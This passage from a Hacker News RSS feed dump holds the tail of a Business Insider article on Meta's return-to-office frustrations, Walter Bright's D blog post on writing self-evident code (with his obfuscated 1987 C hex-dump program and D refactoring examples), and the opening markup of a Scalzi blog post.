                          </figure><p>"We have not yet figured out hybrid work," Adam Mosseri, head of Instagram, wrote on Threads. "Assigned desks mean lots of empty chairs. Hotel desks mean lots of unfamiliar faces. Pods are good for privacy but take up a ton of space. We have a lot to figure out."</p><p>"Hot desks," as they're known, are unassigned desks that need to be booked in advance. Meta last year said it would move to a <a target="_blank" href="https://www.businessinsider.com/facebook-offices-move-to-desk-sharing-as-closures-cost-cuts-mount-2022-11" data-analytics-product-module="body_link" rel=""><u>partial desk sharing model</u></a> in its offices for people who continued to work from home a majority of the time.</p><p>With RTO, some people who were effectively working from home full-time and lost assigned desks, as well as those who officially became remote workers and gave them up, are struggling to get and keep desks when they do need to come into the office.</p><p>"It seems impossible to get one desk for a long enough period," one employee said. The person noted one day having to go between hot desks at Menlo Park on different floors to get through a work day in which they'd been required to come in for meetings. </p><p>The Meta spokesman said any issues with hot desking should be resolved if desks are booked properly through Meta's online desk reservation system, which lets a person book a desk a week in advance for up to three days in a row.</p><h2>"No one is quitting"</h2><p>Such frustrations are not leading to resignations, though.</p><p>"No one is quitting," one employee said. Most people are trying to do what they can to stay employed, the person noted, especially given how tough half-year performance reviews were, and the <a target="_blank" href="https://www.businessinsider.com/meta-layoffs-doubles-target-lowest-performance-ratings-non-regrettable-attrition-2022-12" data-analytics-product-module="body_link" rel=""><u>continued mandate</u></a> that team leaders decide that 14.5% to 16.5% of their workers are in the lower performance categories of "meets most" expectations and "needs support." The other categories at Meta for performance expectations are "redefines," "greatly exceeds," "exceeds," and "meets all."</p><p>"They made it almost impossible to get an 'exceeds,'" an employee said of half-year reviews that ended in early summer. "The next round will be interesting."</p><h2>Applications to be permanently remote</h2><p>Meta lets anyone who has worked at the company for 18 months or more to apply to become a permanent remote worker, under the new RTO policy. Many employees have, although the approval process seems to be slow.</p><p>"Hundreds of people have applied and not heard back yet," an employee said. They assume the backlog of remote work applications to be "in the thousands."</p><p>According to a <a target="_blank" href="https://www.businessinsider.com/meta-rto-policy-updates-stricter-mandate-2023-8" data-analytics-product-module="body_link" rel=""><u>note on RTO from Lori Goler</u></a>, Meta's head of HR, remote work applications received since the mandate was announced in late August will not be reviewed until the end of October. Then, applications will be reviewed monthly.</p><p>Until those applications are approved, everyone with an assigned office is required to appear three days a week, regardless of how their team is distributed.</p><h2>Coming in to be on Zoom</h2><p>One employee noted their team is mostly in other offices. That effectively means their mandatory in-office work is the same as working from home. Except with a commute.</p><p>Others are in the same boat, at least for several more weeks, as they wait for remote work applications to be approved.</p><p>"People are just coming into the office to be on Zoom," the employee said. "Why?"</p><p><em>Are you a Meta employee or someone else with insight to share? Contact Kali Hays at khays@insider.com, on secure messaging app</em><a target="_blank" href="https://signal.org/download/" data-analytics-product-module="body_link" rel=" nofollow"><em><u>Signal</u></em></a><em> at 949-280-0267, or through Twitter DM at @hayskali. Reach out using a non-work device.</em></p></span>
                          
                        
                      </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Crafting Self-Evident Code with D (121 pts)]]></title>
            <link>https://dlang.org/blog/2023/10/02/crafting-self-evident-code-with-d/</link>
            <guid>37748543</guid>
            <pubDate>Tue, 03 Oct 2023 06:25:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dlang.org/blog/2023/10/02/crafting-self-evident-code-with-d/">https://dlang.org/blog/2023/10/02/crafting-self-evident-code-with-d/</a>, See on <a href="https://news.ycombinator.com/item?id=37748543">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
			<p><img src="https://dlang.org/blog/wp-content/uploads/2016/08/d6.png" alt="Digital Mars D logo" width="200" height="200"></p>
<p>Have you ever looked at your code from five years ago and had to study it to figure out what it was doing? And the further back in time you look, the worse it gets? Pity me, who is still maintaining code I wrote over 40 years ago. This article illustrates many simple methods of making your code self-evident and much easier to understand and maintain</p>
<p>To let you know what you’re fightin’ for, allow me to introduce this little gem I wrote back in 1987:</p>
<pre>#include &lt;stdio.h&gt;
#define O1O printf
#define OlO putchar
#define O10 exit
#define Ol0 strlen
#define QLQ fopen
#define OlQ fgetc
#define O1Q abs
#define QO0 for
typedef char lOL;

lOL*QI[] = {"Use:\012\011dump file\012","Unable to open file '\x25s'\012",
  "\012","   ",""};

main(I,Il)
lOL*Il[];
{       FILE *L;
         unsigned lO;
         int Q,OL[' '^'0'],llO = EOF,

         O=1,l=0,lll=O+O+O+l,OQ=056;
         lOL*llL="%2x ";
         (I != 1&lt;&lt;1&amp;&amp;(O1O(QI[0]),O10(1011-1010))),
         ((L = QLQ(Il[O],"r"))==0&amp;&amp;(O1O(QI[O],Il[O]),O10(O)));
         lO = I-(O&lt;&lt;l&lt;&lt;O);
         while (L-l,1)
         {       QO0(Q = 0L;((Q &amp;~(0x10-O))== l);
                         OL[Q++] = OlQ(L));
                 if (OL[0]==llO) break;
                 O1O("\0454x: ",lO);
                 if (I == (1&lt;&lt;1))
                 {       QO0(Q=Ol0(QI[O&lt;&lt;O&lt;&lt;1]);Q&lt;Ol0(QI[0]);
                         Q++)O1O((OL[Q]!=llO)?llL:QI[lll],OL[Q]);/*"
                         O10(QI[1O])*/
                         O1O(QI[lll]);{}
                 }
                 QO0 (Q=0L;Q&lt;1&lt;&lt;1&lt;&lt;1&lt;&lt;1&lt;&lt;1;Q+=Q&lt;0100)
                 {       (OL[Q]!=llO)? /* 0010 10lOQ 000LQL */
                         ((D(OL[Q])==0&amp;&amp;(*(OL+O1Q(Q-l))=OQ)),
                         OlO(OL[Q])):
                         OlO(1&lt;&lt;(1&lt;&lt;1&lt;&lt;1)&lt;&lt;1);
                 }
                 O1O(QI[01^10^9]);
                 lO+=Q+0+l;}
         }
         D(l) { return l&gt;=' '&amp;&amp;l&lt;='\~';
}
</pre>
<p>Yes, this is how we wrote C code back then. I even <a href="https://www.ioccc.org/winners.html">won an award</a> for it!</p>
<p>Although I am a very slow learner, I do learn over time, and gradually the code got better. You’re probably having the same issues with your code. (Or the code written by coworkers, as I agree that <em>your</em> code certainly does not need improvement!)</p>
<p>This article is about techniques that will help make code self-evident. You are probably already doing some of them. I bet there are some you aren’t. I also am sure you’re going to argue with me about some of them. Trust me, you’re wrong! If you don’t agree with me now, you will if you’re still programming five years hence.</p>
<p>I know you’re busy, so let’s jump right in with an observation:</p>
<p>“Anybody can write complicated code. It takes genius to write simple code.”</p>
<p>or, if you prefer:</p>
<p>“The highest accolade your code can garner is: oh pshaw, anybody could have<br>
written that!”</p>
<p>For example, since I started as an aerospace engineer:</p>
<p><img loading="lazy" src="https://dlang.org/blog/wp-content/uploads/2023/10/lever.jpg" alt="" width="1066" height="1600" srcset="https://dlang.org/blog/wp-content/uploads/2023/10/lever.jpg 1066w, https://dlang.org/blog/wp-content/uploads/2023/10/lever-200x300.jpg 200w, https://dlang.org/blog/wp-content/uploads/2023/10/lever-682x1024.jpg 682w, https://dlang.org/blog/wp-content/uploads/2023/10/lever-768x1153.jpg 768w, https://dlang.org/blog/wp-content/uploads/2023/10/lever-1023x1536.jpg 1023w, https://dlang.org/blog/wp-content/uploads/2023/10/lever-624x937.jpg 624w" sizes="(max-width: 1066px) 100vw, 1066px"></p>
<p>consider this lever commonly found in aircraft cockpits. No fair if you already know what it does. Examine it casually. What is it for?</p>
<p>.</p>
<p>.</p>
<p>.</p>
<p>It raises and lowers the landing gear. What’s the clue? It’s got a little tire for a knob! Pull the lever up, and the gear gets sucked up. Push it down, the gear goes down. Is that self-evident or what? It’s a masterpiece of simplicity. It doesn’t even need any labels. If the cockpit is filled with smoke, or you’re focused on what’s outside the window, your hand knows immediately it’s on the gear lever—not the flaps or the throttles or the copilot’s ejection seat (just kidding). This kind of stupid simple control is what cockpit designers strive for because pulling the right lever is literally a life-and-death decision. I mean <em>literally</em> in the literal sense of the word.</p>
<p>This is what we desperately want to achieve in programming. Stupid simple. We’ll probably fail, but the closer the better.</p>
<p>Diving in…</p>
<h3 id="justshootmenow">Just Shoot Me Now</h3>
<pre>#define BEGIN {
#define END   }</pre>
<p>Believe it or not, this was common C practice back in the 1980s. It falls into the category of “Don’t try to make your new language look like your previous language”. This problem appears in multiple guises. I still tend to name variables in Fortran style from back when the oceans hadn’t yet formed. Before moving to D, I realized that using C macros to invent a personal custom language on top of C was an abomination. Removing it and replacing it with ordinary C code was a big improvement in clarity.</p>
<h3 id="don’treinventbool">Don’t Reinvent bool</h3>
<p>Learn what bool is and use it as intended. Accept that the following are all the same:</p>
<table rows="5" cols="2">
<tbody><tr>
<td>false</td>
<td>true</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>no</td>
<td>yes</td>
</tr>
<tr>
<td>off</td>
<td>on</td>
</tr>
<tr>
<td>0 volts</td>
<td>5 volts</td>
</tr>
</tbody></table>
<p>And that this makes code unequivocally worse:</p>
<pre>enum { No, Yes };</pre>
<p>Just use <code>false</code> and <code>true</code>. Done. And BTW,</p>
<pre>enum { Yes, No };</pre>
<p>is just an automatic “no hire” decision, as <code>if (Yes)</code> will thoroughly confuse everyone. If you’ve done this, run and fix it before someone curses your entire ancestry.</p>
<h3 id="horrorsblockedbyd">Horrors Blocked by D</h3>
<p>D’s syntax has been designed to prevent some types of coding horrors.</p>
<h4 id="cregexexpressionswithoperatoroverloading">C++ Regex expressions with operator overloading</h4>
<p>I’m not even going to link to this. It can be found with diligent searching. What it does is use operator overloading to make ordinary-looking C++ code actually be a regex! It violates the principle that code should not pretend to be in another language. Imagine the inept error messages the compiler will bless you with if there’s a coding mistake with this. D makes this hard to do by only allowing arithmetic operators to be overloaded, which disallows things like an overloaded unary <code>*</code>.</p>
<p>(It’s harder, but still possible, to abuse operator overloading in D. But fortunately, making it harder has largely discouraged it.)</p>
<h4 id="metaprogrammingwithmacros">Metaprogramming with macros</h4>
<p>Many people have requested macros be added to D. We’ve resisted this because macros inevitably result in people inventing their own custom, undocumented language layered over D. This makes it impractical for anyone else to make use of this code. In my not-so-humble opinion, macros are the reason why Lisp has never caught on in the mainstream. No Lisper can read anyone else’s Lisp code.</p>
<h4 id="cargumentdependentlookup">C++ Argument Dependent Lookup</h4>
<p>Nobody knows what symbol will actually be found. ADL was added so one could do operator overloading on the left operand. D just has a simple syntax for left or right operand overloading.</p>
<h4 id="sfinae">SFINAE</h4>
<p>Nobody knows if SFINAE is in play or not for any particular expression.</p>
<h4 id="floorwaxortastydesserttopping">Floor Wax or Tasty Dessert Topping</h4>
<p>This refers to the confusion between a struct being a value type or a reference type or some chimera of both. In D, a struct is a value type and a class is a reference type. To be fair, some people still try to build a D chimera type, but they should be cashiered.</p>
<h4 id="multipleinheritance">Multiple inheritance</h4>
<p>Nobody has ever made a convincing case for why this is needed. Things get really nasty when diamond inheritance is used. Pity the next guy and avoid the temptation. D has multiple inheritance for interfaces only, which has proved to be more than adequate.</p>
<h3 id="codeflow">Code Flow</h3>
<p>Code should flow from left to right, and top to bottom. Just like how this article is read.</p>
<pre>f() + g() // which executes first?</pre>
<p>Fortunately, D guarantees a left-to-right ordering (C does not). But what about:</p>
<pre>g(f(e(d(c(b(a))),3)));</pre>
<p>That executes inside out! Quick, which function call does the <code>3</code> get passed to? D’s Universal Function Call Syntax to the rescue:</p>
<pre>a.b.c.d(3).e.f.g;</pre>
<p>That’s the equivalent, but execution flows clearly left-to-right. Is this an extreme example, or the norm?</p>
<pre>import std.stdio;
import std.array;
import std.algorithm;

void main() {
     stdin.byLine(KeepTerminator.yes).
     map!(a =&gt; a.idup).
     array.
     sort.
     copy(stdout.lockingTextWriter());
}</pre>
<p>This code reads from <code>stdin</code> by lines, puts the lines in an array, sorts the array, and writes the sorted result to <code>stdout</code>. It doesn’t quite meet our “stupid simple” criteria, but it is pretty close. All with a nice flow from left to right and top to bottom.</p>
<p>The example also nicely segues into the next observation.</p>
<h3 id="themorecontrolpathsthelessunderstandable">The More Control Paths, the Less Understandable</h3>
<blockquote>
<p>Shaw: You know a great deal about computers, don’t you?<br>
Mr. Spock: I know all about them.</p>
</blockquote>
<p>I submit that:</p>
<pre>version (X)
     doX();
doY();
if (Z)
     doZ();</pre>
<p>is less comprehensible than:</p>
<pre>doX();
doY();
doZ();</pre>
<p>What happened to the conditional expressions? Move them to the interiors of <code>doX()</code> and <code>doZ()</code>.</p>
<p>I know what you’re thinking. “But Walter, you didn’t eliminate the conditional expressions, you just moved them!” Quite right, but those conditional expressions properly belong in the functions, rather than enclosing those functions. They are part of the conceptual encapsulation a function provides, so the caller is clean.</p>
<h3 id="negation">Negation</h3>
<p>Negation in English:</p>
<blockquote>
<p>Dr McCoy: We’re trying to help you, Oxmyx.<br>
Bela Oxmyx: Nobody helps nobody but himself.<br>
Mr. Spock: Sir, you are employing a double negative.</p>
</blockquote>
<blockquote>
<p>Cowardly Lion: Not nobody! Not nohow!</p>
</blockquote>
<p>Negation in English is often used as emphasis, rather than logical negation. Our perception of negation is fuzzy and fraught with error. This is something propagandists use to smear someone.</p>
<p>What the propagandist says: “Bob is not a drunkard!”</p>
<p>What the audience hears: “Bob is a drunkard!”</p>
<p>Skilled communicators avoid negation. Savvy programmers do, too. How many times have you overlooked a not operator? I have many times.</p>
<pre>if (!noWay)</pre>
<p>is inevitably perceived as:</p>
<pre>if (noWay)</pre>
<p>I mentioned this discovery to my good friend Andrei Alexandrescu. He didn’t buy it. He said I needed research to back it up. I didn’t have any research, but didn’t change my mind (i.e., hubris). Eventually, I did run across a paper that did do such research and came to the same conclusion as my assumption. I excitedly sent it to Andrei, and to his great credit, he conceded defeat, which is why Andrei is an exceptional man (rare is the person who ever concedes defeat!).</p>
<p>The lesson here is to avoid using negation in identifiers if at all possible.</p>
<pre>if (way)</pre>
<p>Isn’t that better?</p>
<h4 id="dmdsourcecodehallofshame">DMD Source Code Hall of Shame</h4>
<p>My own code is hardly a paragon of virtue. Some identifiers:</p>
<ul>
<li><code>tf.isnothrow</code></li>
<li><code>IsTypeNoreturn</code></li>
<li><code>Noaccesscheck</code></li>
<li><code>Ignoresymbolvisibility</code></li>
<li><code>Include.notComputed</code></li>
<li><code>not nothrow</code></li>
</ul>
<p>I have no excuse and shall have myself flagellated with a damp cauliflower. Did I say I didn’t like the code I wrote five years ago?</p>
<p>This leads us to the D <code>version</code> conditional.</p>
<h3 id="negationandversion">Negation and <code>version</code></h3>
<p><a href="https://dlang.org/spec/version.html#version-specification">D version conditionals</a> are very simple:</p>
<pre>version ( Identifier )</pre>
<p><em>Identifier</em> is usually predefined by the compiler or the command line. Only an identifier is allowed—no negation, AND, OR, or XOR. (Collectively call that <em>version algebra</em>.) Our users often chafe at this restriction, and I get that it’s difficult to accept the rationale at first. It’s not impossible to do version algebra:</p>
<pre>version (A) { } else {
    // !A
}

version (A) version (B) {
    // A &amp;&amp; B
}

version (A) version = AorB;
version (B) version = AorB;
version (AorB) {
     // A || B
}</pre>
<p>and so forth. But it’s clumsy and unattractive <em>on purpose</em>. Why would D do such a thing? It’s meant to encourage thinking about versions in a positive manner. Suppose a project has a Windows and an OSX build:</p>
<pre>version (Windows) {
     ...
}
else version (OSX) {
     ...
}
else
     static assert(0, "unsupported operating system");</pre>
<p>Isn’t that better than this:</p>
<pre>...
version (!Windows){
...
}</pre>
<p>I’ve seen an awful lot of that style in C. It makes it pointlessly difficult to add support for a new operating system. After all, what the heck is the “not Windows” operating system? That really narrows things down! The former snippet makes it so much easier.</p>
<p>Taking this a step further:</p>
<pre>if (A &amp;&amp; B &amp;&amp; C &amp;&amp; D)

if (A || B || C || D)</pre>
<p>are easy for a human to parse. Encountering:</p>
<pre>if (A &amp;&amp; (!B || C))</pre>
<p>is always like transitioning from smooth asphalt to a cobblestone road. Ugh. I’ve made mistakes with such constructions all the time. Not only is it hard to even see the <code>!</code>, but it’s still hard to satisfy yourself that it is correct.</p>
<p>Fortunately, De Morgan’s Theorem can sometimes come to the rescue:</p>
<pre>(!A &amp;&amp; !B) =&gt; !(A || B)
(!A || !B) =&gt; !(A &amp;&amp; B)</pre>
<p>It gets rid of one negation. Repeated application can often transform it into a much more easily understood equation while being equally correct.</p>
<p>Anecdote: When designing digital logic circuits, the NAND gate is more efficient than the AND gate because it has one less transistor. (AND means (A &amp;&amp; B), NAND means !(A &amp;&amp; B)). But humans just stink at crafting bug-free NAND logic. When I worked on the design of the <a href="https://en.wikipedia.org/wiki/Advanced_Boolean_Expression_Language">ABEL programming language</a> back in the 1980s, which was for programming Programmable Logic Devices, ABEL would accept input in positive logic. It would use De Morgan’s theorem to automatically convert it to efficient negative logic. The electronics designers loved it.</p>
<p>To sum up this section, here’s a shameful snippet from Ubuntu’s unistd.h:</p>
<pre>#if defined __USE_BSD || (defined __USE_XOPEN &amp;&amp; !defined __USE_UNIX98)</pre>
<blockquote>
<p>Prof Marvel: I can’t bring it back, I don’t know how it works!</p>
</blockquote>
<h3 id="castsarebugs">Casts Are Bugs</h3>
<p>Casts subvert the protections of the typing system. Sometimes you just gotta have them (to implement <code>malloc</code>, for example, the result needs a cast), but far too often they are simply there to correct sloppy misuse of types. Hence, in D casts are done with the keyword <code>cast</code>, not a peculiar syntax, making them easily greppable. It’s worthwhile to occasionally grep a code base for <code>cast</code> and see if the types can be reworked to eliminate the need for the cast and have the type system working for rather than against you.</p>
<p>Pull Request: <a href="https://github.com/dlang/dmd/pull/15488">remove some dyncast calls</a></p>
<h3 id="self-documentingfunctiondeclarations">Self-Documenting Function Declarations</h3>
<pre>char* xyzzy(char* p)</pre>
<ul>
<li>Does <code>p</code> modify what it points to?</li>
<li>Is <code>p</code> returned?</li>
<li>Does <code>xyzzy</code> free <code>p</code>?</li>
<li>Does <code>xyzzy</code> save <code>p</code> somewhere, like in a global?</li>
<li>Does <code>xyzzy</code> throw <code>p</code>?</li>
</ul>
<p>These crucial bits of information are rarely noted in the documentation for the function. Even worse, the documentation often gets it wrong! What is needed is self-documenting code that is enforced by the compiler. D has attributes to cover this:</p>
<pre>const char* xyzzy(return scope const char* p)</pre>
<ul>
<li><code>p</code> doesn’t modify what it points to</li>
<li><code>p</code> is returned</li>
<li><code>p</code> is not free’d</li>
<li><code>xyzzy</code> does not squirrel away a copy of <code>p</code></li>
<li><code>p</code> is not thrown in an exception</li>
</ul>
<p>This is all documentation that now isn’t necessary to write, and the compiler will check its accuracy for you. Yes, it is called “attribute soup” for good reason, and takes some getting used to, but it’s still better than bad documentation, and adding attributes is optional.</p>
<h3 id="functionargumentsandreturns">Function Arguments and Returns</h3>
<p>Function inputs and outputs present in the function declaration are the “front door”. Any inputs and outputs that are not in the function declaration are “side doors”. Side doors include things like global variables, environment variables, getting information from the operating system, reading/writing files, throwing exceptions, etc. Side doors are rarely accounted for in the documentation. The poor sap calling a function has to carefully read its implementation to discern what the side doors are.</p>
<p>Self-evident code should strive to run everything through the front door. Not only does this help with comprehension, but it also enables delightful things like easy unit testing.</p>
<h3 id="memoryallocation">Memory Allocation</h3>
<p>An ongoing problem faced by functions that implement an algorithm that needs to allocate memory is what memory allocation scheme should be used. Often a reusable function imposes the memory allocation method on the caller. That’s backward.</p>
<p>For memory that is allocated and free’d by the function, the solution is that the function decides how to do it. For allocated objects that are returned by the function, the caller should decide the allocation scheme by passing an argument that specifies it. This argument often takes the form of a “sink” to send the output to. More on that later.</p>
<h3 id="passabstract“sink”foroutput">Pass Abstract “sink” for Output</h3>
<p>The auld way (extracted from the DMD source code):</p>
<pre>import dmd.errors;
void gendocfile(Module m) {
     ...
     if (!success)
         error("expansion limit");
}</pre>
<p><code>error()</code> is a function that error messages are sent to. This is a typical formulation seen in conventional code. The error message is going out through the side door. The caller of <code>gendocfile()</code> has no say in what’s done with the error message, and the fact that it even generates error messages is usually omitted by the documentation. Worse, the error message emission makes it impractical to properly unit test the function.</p>
<p>A better way is to pass an abstract interface “sink” as a parameter and send the error messages to the sink:</p>
<pre>import dmd.errorsink;
void gendocfile(Module m, ErrorSink eSink) {
     ...
     if (!success)
         eSink.error("expansion limit");
}
</pre>
<p>Now the caller has total control of what happens to the error messages, and it is implicitly documented. A unit tester can provide a special implementation of the interface to suit testing convenience.</p>
<p>Here’s a real-world PR making this improvement:</p>
<p><a href="https://github.com/dlang/dmd/pull/15471">doc.d: use errorSink</a></p>
<h3 id="passfilesasbuffersratherthanfilestoread">Pass Files as Buffers Rather than Files to Read</h3>
<p>Typical code I’ve written, where the file names are passed to a function to read and process them:</p>
<pre>void gendocfile(Module m, const(char)*[] docfiles) {
     OutBuffer mbuf;
     foreach (file; ddocfiles) {
         auto buffer = readFile(file.toDString());
         mbuf.write(buffer.data);
     }
     ...
}</pre>
<p>This kind of code is a nuisance to unit test, as adding file I/O to the unit tester is very clumsy, and, as a result, no unit tests get written. Doing file I/O is usually irrelevant to the function, anyway. It just needs the <em>data</em> to operate on.</p>
<p>The fix is to pass the contents of the file in an array:</p>
<pre>void gendocfile(Module m, const char[] ddoctext) {
     ...
}</pre>
<p>The PR: <a href="https://github.com/dlang/dmd/pull/15525">move ddoc file reads out of doc.d</a></p>
<h3 id="writetobuffercallerwritesfile">Write to Buffer, Caller Writes File</h3>
<p>A typical function that processes data and writes the result to a file:</p>
<pre>void gendocfile(Module m) {
     OutBuffer buf;
     ... fill buf ...
     writeFile(m.loc, m.docfile.toString(), buf[ ]);
}</pre>
<p>By now, you know that the caller should write the file:</p>
<pre>void gendocfile(Module m, ref OutBuffer outbuf) {
     ... fill outbuf ...
}</pre>
<p>And the PR:<br>
<a href="https://github.com/dlang/dmd/pull/15535">doc.d: move file writes to caller</a></p>
<h3 id="moveenvironmentcallstocaller">Move Environment Calls to Caller</h3>
<p>Here’s a function that obtains input from the environment:</p>
<pre>void gendocfile(Module m) {
     char* p = getenv("DDOCFILE");
     if (p)
         global.params.ddoc.files.shift(p);
}</pre>
<p>It should be pretty obvious by now what is wrong with that. PR to move the environment read to the caller and then pass the info through the front door:</p>
<p><a href="https://github.com/dlang/dmd/pull/15503">move DDOCFILE from doc.d to main.d</a></p>
<h3 id="usepointerstofunctionsortemplates">Use Pointers to Functions (or Templates)</h3>
<p>I was recently working on a module that did text processing. One thing it needed to do was identify the start of an identifier string. Since Unicode is complicated, it imported the (rather substantial) module that handled Unicode. But it bugged me that all that was needed was to determine the start of an identifier; the text processor needed no further knowledge of Unicode.</p>
<p>It finally occurred to me that the caller could just pass a function pointer as an argument to the text processor, and the text processor would need no knowledge whatsoever of Unicode.</p>
<pre>import dmd.doc;
bool expand(...) {
     if (isIDStart(p))
         ...
}</pre>
<p>became:</p>
<pre>alias fp_t = bool function(const(char)* p);
bool expand(..., fp_t isIDStart) {
     if (isIDStart(p))
         ...
}</pre>
<p>Notice how the import just went away, improving the encapsulation and comprehensibility of the function. The function pointer could also be a template parameter, whichever is more convenient for the application. The more moats one can erect around a function, the easier it is to understand.</p>
<p>The PR: <a href="https://github.com/dlang/dmd/pull/15470">remove dmacro.d dependency on doc.d</a></p>
<h3 id="twocategoriesoffunctions">Two Categories of Functions</h3>
<ul>
<li>Alters the state of the program</li>
</ul>
<p>Provide a clue in the name of the function, like <code>doAction()</code>.</p>
<ul>
<li>Asks a Question</li>
</ul>
<p>Again, a clue should be in the name. Something like <code>isSomething()</code>, <code>hasCharacteristic()</code>, <code>getInfo()</code>, etc. Consider making the function <code>pure</code> to ensure it has no side effects.</p>
<p>Try not to create functions that both ask a question and modify state. Over time, I’ve been gradually splitting such functions into two.</p>
<h3 id="visualpatternrecognition">Visual Pattern Recognition</h3>
<p>Source code formatters are great. But I don’t use them. Oof! Here’s why:</p>
<pre>final switch (of)
{
     case elf:   lib = LibElf_factory();    break;
     case macho: lib = LibMach_factory();   break;
     case coff:  lib = LibMSCoff_factory(); break;
     case omf:   lib = LibOMF_factory();    break;
}</pre>
<p>It turns out your brain is incredibly good at pattern recognition. By lining things up, a pattern is created. Any deviation from that pattern is likely a bug, and your eyes will be drawn to the anomaly like a stink bug to rotting fruit.</p>
<p>I’ve detected so much rotting fruit by using patterns, and a source code formatter doesn’t do a good job of making patterns.</p>
<blockquote>
<p>Prof. Marvel: I have reached a cataclysmic decision!</p>
</blockquote>
<h3 id="userefinsteadof">Use <code>ref</code> instead of <code>*</code></h3>
<p>A <code>ref</code> is a restricted form of pointer. Arithmetic is not allowed on it, and <code>ref</code> parameters are not allowed to escape a function. This not only informs the user but <em>informs the compiler</em>, which will ensure the function is a good boy with the <code>ref</code>.</p>
<p>PR: <a href="https://github.com/dlang/dmd/pull/15487">mangleToBuffer(): use ref</a></p>
<h2 id="takeaways">Takeaways</h2>
<ul>
<li>Use language features as intended (don’t invent your own language<br>
on top of it)</li>
<li>Avoid negation</li>
<li>Left to right, top to bottom</li>
<li>Functions do everything through the front door</li>
<li>Don’t conflate engine with environment</li>
<li>Reduce cyclomatic complexity</li>
<li>Separate functions that ask a question from functions that alter state</li>
<li>Keep trying—this is a process!</li>
</ul>
<p>The recommendations here are pretty easy to follow. It’ll rarely be necessary to do much refactoring to implement them. I hope the real-life PRs referenced here show how easy it is to make code self-evident!</p>
<h2 id="actionitem">Action Item</h2>
<p>Open your latest coding masterpiece in your favorite editor. Take a good hard look at it. Sorry, it’s a steaming pile of incomprehensibility! (Join the club.)</p>
<p>Go fix it!</p>
					</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ági Szabados Does Not Need to Apologize to Me (135 pts)]]></title>
            <link>https://whatever.scalzi.com/2023/10/02/agi-szabados-does-not-need-to-apologize-to-me/</link>
            <guid>37748433</guid>
            <pubDate>Tue, 03 Oct 2023 06:03:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://whatever.scalzi.com/2023/10/02/agi-szabados-does-not-need-to-apologize-to-me/">https://whatever.scalzi.com/2023/10/02/agi-szabados-does-not-need-to-apologize-to-me/</a>, See on <a href="https://news.ycombinator.com/item?id=37748433">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

	
	

	
		<p>
		<span>
			<i></i>
			Posted on			<a href="https://whatever.scalzi.com/2023/10/02/agi-szabados-does-not-need-to-apologize-to-me/" rel="bookmark">October 2, 2023</a>
			&nbsp;&nbsp;
			Posted by										&nbsp;&nbsp;
				 &nbsp;<a href="https://whatever.scalzi.com/2023/10/02/agi-szabados-does-not-need-to-apologize-to-me/#comments">
				27 Comments</a>		</span>
	</p>
	
<figure><img decoding="async" fetchpriority="high" width="639" height="639" data-attachment-id="49445" data-permalink="https://whatever.scalzi.com/2023/10/02/agi-szabados-does-not-need-to-apologize-to-me/screenshot-2023-10-02-174121/" data-orig-file="https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/10/Screenshot-2023-10-02-174121.png?fit=1030%2C1030&amp;ssl=1" data-orig-size="1030,1030" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot-2023-10-02-174121" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/10/Screenshot-2023-10-02-174121.png?fit=300%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/10/Screenshot-2023-10-02-174121.png?fit=1030%2C1030&amp;ssl=1" src="https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/10/Screenshot-2023-10-02-174121.png?resize=639%2C639&amp;ssl=1" alt="" srcset="https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/10/Screenshot-2023-10-02-174121.png?w=1030&amp;ssl=1 1030w, https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/10/Screenshot-2023-10-02-174121.png?resize=300%2C300&amp;ssl=1 300w, https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/10/Screenshot-2023-10-02-174121.png?resize=768%2C768&amp;ssl=1 768w, https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/10/Screenshot-2023-10-02-174121.png?resize=800%2C800&amp;ssl=1 800w, https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/10/Screenshot-2023-10-02-174121.png?resize=600%2C600&amp;ssl=1 600w, https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/10/Screenshot-2023-10-02-174121.png?resize=400%2C400&amp;ssl=1 400w, https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/10/Screenshot-2023-10-02-174121.png?resize=200%2C200&amp;ssl=1 200w, https://i0.wp.com/whatever.scalzi.com/wp-content/uploads/2023/10/Screenshot-2023-10-02-174121.png?resize=640%2C640&amp;ssl=1 640w" sizes="(max-width: 639px) 100vw, 639px" data-recalc-dims="1"></figure>


<div>
